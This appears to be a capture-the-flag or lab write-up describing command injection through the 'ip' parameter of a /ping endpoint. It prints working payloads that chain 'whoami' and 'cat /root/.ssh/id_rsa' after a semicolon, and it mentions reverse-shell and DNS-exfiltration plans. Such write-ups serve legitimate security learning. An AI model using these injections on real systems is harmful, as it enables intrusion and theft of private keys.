# 🧪 Command Injection via Ping Endpoint

**Date:** 2025-05-21  
**Category:** Web / Command Injection  
**Lab/Platform:** Custom Challenge / CTF  

---

## 🧠 Objective

Identify and exploit command injection vulnerability in the `ip` parameter of a `/ping` endpoint to:

- Enumerate internal hosts
- Confirm remote code execution
- Exfiltrate sensitive data (`.ssh` keys, etc.)

---

## 🔍 Discovery

Initial request:
```
GET /ping?ip=10.0.0.1
```

Returned:
```
Pinging 10.0.0.1 with 32 bytes of data...
```

Tried injecting:
```
GET /ping?ip=127.0.0.1;whoami
```

Got:
```
Pinging 127.0.0.1
root
```

✅ **Command Injection confirmed.**

---

## 🔨 Exploitation Steps

1. Enumerated internal network:
   - Loop from `10.0.0.1` to `10.0.0.254`
   - Used bash script and checked response differences

2. Checked for `.ssh`:
   ```
   /ping?ip=127.0.0.1;cat /root/.ssh/id_rsa
   ```

   → Found private key

3. Tried reverse shell (didn't work due to firewall)

---

## 📚 What I Learned

- Difference between SSRF and command injection
- Using `;`, `|`, `&&` to break into shell
- Using response timing to detect blind injection

---

## 🚀 Next Steps

- Try chaining with curl/wget for reverse shell
- Research blind injection with DNS-based exfil
- Automate with Python + threading
